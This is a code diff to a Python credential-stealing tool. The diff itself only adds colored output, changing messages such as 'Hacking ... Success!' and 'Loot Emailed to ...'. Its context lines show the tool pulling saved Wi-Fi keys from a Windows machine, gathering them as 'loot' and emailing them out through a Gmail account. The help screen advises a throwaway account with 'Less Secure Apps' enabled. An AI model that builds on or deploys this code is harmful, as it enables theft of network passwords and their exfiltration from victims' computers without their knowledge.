@@ -38,6 +38,10 @@ exit_code = colored('Exit', input_status_color)
     # colored bullet points [help menu]
 bullet_point = colored('* ', source_status_color)
 
+    # colored adress
+def color_address(write):
+    return colored(f'"{write}"', source_status_color)
+
 
 # generate loot file
 def password_file_generator():
@@ -193,7 +197,8 @@ def get_passwords():
                 if line.startswith('    Key Content'):
                     appended_cred = f'{network} = {exfiltrated_creds}'
                     creds.append(appended_cred)
-                    print(colored(f'Hacking "{network}" Success!', confirmation_status_color))
+                    net = color_address(network)
+                    print(colored(f'Hacking {net}'+colored(' Success!', confirmation_status_color), confirmation_status_color))
 
                 else:
                     continue
@@ -258,7 +263,8 @@ def email_output(pass_db, checked_cred, loot):
             email_server.login(account_email, account_pass)
             email_server.sendmail(account_email, account_email, message.as_string())
             email_server.quit()
-            print(colored(f'Loot Emailed to "{account_email}"', confirmation_status_color))
+            gmail = color_address(account_email)
+            print(colored(f'Loot Emailed to {gmail}', confirmation_status_color))
 
         # error detection
         except:
@@ -289,8 +295,8 @@ def help_screen():
     print(colored('\nRequirements :', title_color))
     print(bullet_point + colored('python3 [pip]', input_status_color))
     print(bullet_point + colored('Windows Computer', input_status_color))
-    print(bullet_point + colored('Gmail Account [Personal Account Not Suggested]', input_status_color))
-    print(bullet_point + colored('Gmail Must Allow Less Secure Apps', input_status_color))
+    print(bullet_point + colored('*Gmail Account [Personal Account Not Suggested]', input_status_color))
+    print(bullet_point + colored('*Gmail Must Allow Less Secure Apps', input_status_color))
     print(bullet_point + colored('\t-Activated by Navigating to {lsa_link}', input_status_color))
 
     # instructions
